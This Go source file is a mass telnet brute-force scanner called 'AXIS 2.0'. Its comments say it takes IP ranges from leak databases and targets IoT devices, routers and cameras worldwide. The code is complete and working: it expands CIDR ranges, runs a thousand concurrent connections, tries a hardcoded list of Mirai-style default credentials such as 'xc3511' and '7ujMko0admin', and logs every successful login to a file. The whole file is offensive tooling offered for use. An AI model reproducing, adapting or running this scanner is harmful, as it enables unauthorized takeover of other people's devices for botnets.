package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

/* ============================================================================
 * SERVER-SIDE TELNET SCANNER - Mass Brute-Force Module
 * ============================================================================
 * Scans IP ranges from leak databases (IllusionSec DDOS-archive)
 * Targets: IoT devices, routers, cameras with weak telnet credentials
 * Features: CIDR expansion, concurrent scanning, result logging
 * Global coverage: Africa, Asia, Latin America, Middle East, Europe
 * ============================================================================ */

// Telnet credentials from scanner.c
var usernames = []string{
	"root", "admin", "support", "guest", "user", "default", "manager",
	"operator", "supervisor", "technician", "service", "tech", "maint",
}

var passwords = []string{
	"root", "admin", "password", "123456", "1234", "12345", "default",
	"guest", "support", "user", "manager", "operator", "supervisor",
	"technician", "service", "tech", "maint", "maintenance", "service",
	"vizxv", "xc3511", "dreambox", "klv123", "klv1234", "admin@123",
	"Zte521", "tl789", "hs7m0dd", "7ujMko0vizxv", "7ujMko0admin",
}

type Result struct {
	IP       string
	Port     string
	Username string
	Password string
}

func checkTelnet(ip, port string, wg *sync.WaitGroup, results chan<- Result, sem chan struct{}) {
	defer wg.Done()

	sem <- struct{}{} // Acquire semaphore
	defer func() { <-sem }() // Release semaphore

	addr := ip + ":" + port
	conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(5 * time.Second))

	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		return
	}

	if !strings.Contains(string(buf[:n]), "login") && !strings.Contains(string(buf[:n]), "Password") {
		return
	}

	// Try credentials
	for _, username := range usernames {
		for _, password := range passwords {
			conn, err := net.DialTimeout("tcp", addr, 3*time.Second)
			if err != nil {
				continue
			}

			conn.SetDeadline(time.Now().Add(5 * time.Second))
			
			// Read banner
			conn.Read(buf)
			
			// Send username
			conn.Write([]byte(username + "\r\n"))
			time.Sleep(100 * time.Millisecond)
			conn.Read(buf)
			
			// Send password
			conn.Write([]byte(password + "\r\n"))
			time.Sleep(100 * time.Millisecond)
			n, _ := conn.Read(buf)
			
			response := string(buf[:n])
			if strings.Contains(response, "#") || strings.Contains(response, "$") || 
				strings.Contains(response, "Welcome") || strings.Contains(response, "success") {
				
				results <- Result{
					IP:       ip,
					Port:     port,
					Username: username,
					Password: password,
				}
				conn.Close()
				return
			}
			conn.Close()
		}
	}
}

func expandCIDR(cidr string, port string) []string {
	var ips []string
	
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return ips
	}
	
	mask := ipnet.Mask
	network := ipnet.IP
	ones, bits := mask.Size()
	
	// Calculate number of hosts
	hosts := uint32(1) << (uint32(bits) - uint32(ones))
	
	// Skip if too large (more than /16 = 65536 IPs)
	if hosts > 65536 {
		fmt.Printf("[*] Skipping large CIDR %s (%d IPs, max /16)\n", cidr, hosts)
		return ips
	}
	
	// Convert network IP to uint32
	ipUint32 := uint32(network[0])<<24 | uint32(network[1])<<16 | uint32(network[2])<<8 | uint32(network[3])
	
	// Generate all IPs in range
	for i := uint32(0); i < hosts; i++ {
		ip := ipUint32 + i
		ipStr := fmt.Sprintf("%d.%d.%d.%d:%s",
			(ip>>24)&0xFF,
			(ip>>16)&0xFF,
			(ip>>8)&0xFF,
			ip&0xFF,
			port)
		ips = append(ips, ipStr)
	}
	
	return ips
}

func loadIPList(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var ips []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		// Handle CIDR notation
		if strings.Contains(line, "/") {
			parts := strings.Split(line, ":")
			port := "23" // default telnet port
			cidr := parts[0]
			
			// If port specified with CIDR (e.g., 1.2.3.0/24:23)
			if len(parts) > 1 {
				port = parts[1]
			}
			
			// Expand CIDR to individual IPs
			expanded := expandCIDR(cidr, port)
			fmt.Printf("[*] Expanded CIDR %s to %d IPs\n", cidr, len(expanded))
			ips = append(ips, expanded...)
			continue
		}

		// Handle IP:port format
		if strings.Contains(line, ":") {
			ips = append(ips, line)
		} else {
			// Add default telnet port
			ips = append(ips, line+":23")
		}
	}

	return ips, scanner.Err()
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: ./telnet-scanner <ip-list.lst> [threads]")
		fmt.Println("Example: ./telnet-scanner target-subnets.lst 1000")
		os.Exit(1)
	}

	ipFile := os.Args[1]
	threads := 1000
	if len(os.Args) > 2 {
		threads, _ = strconv.Atoi(os.Args[2])
	}

	fmt.Printf("[*] AXIS 2.0 Server-Side Telnet Scanner\n")
	fmt.Printf("[*] Loading IP list from: %s\n", ipFile)
	fmt.Printf("[*] Using %d concurrent threads\n", threads)

	ips, err := loadIPList(ipFile)
	if err != nil {
		fmt.Printf("[-] Error loading IP list: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[*] Loaded %d IP addresses\n", len(ips))
	fmt.Printf("[*] Starting scan...\n\n")

	var wg sync.WaitGroup
	var scannedCount int64
	results := make(chan Result, 100)
	sem := make(chan struct{}, threads)

	// Start result writer
	go func() {
		f, _ := os.OpenFile("telnet_results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		defer f.Close()
		
		for result := range results {
			line := fmt.Sprintf("%s:%s %s:%s\n", result.IP, result.Port, result.Username, result.Password)
			f.WriteString(line)
			fmt.Printf("[+] SUCCESS: %s:%s | %s:%s\n", result.IP, result.Port, result.Username, result.Password)
		}
	}()

	startTime := time.Now()

	// Start a progress monitoring goroutine
	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		for {
			<-ticker.C
			current := atomic.LoadInt64(&scannedCount)
			fmt.Printf("[*] Progress: %d/%d IPs scanned...\n", current, len(ips))
		}
	}()

	for _, ip := range ips {
		parts := strings.Split(ip, ":")
		if len(parts) != 2 {
			continue
		}

		wg.Add(1)
		go checkTelnet(parts[0], parts[1], &wg, results, sem)
	}

	wg.Wait()
	close(results)

	elapsed := time.Since(startTime)
	fmt.Printf("\n[*] Scan completed in %s\n", elapsed)
	fmt.Printf("[*] Results saved to: telnet_results.txt\n")
}
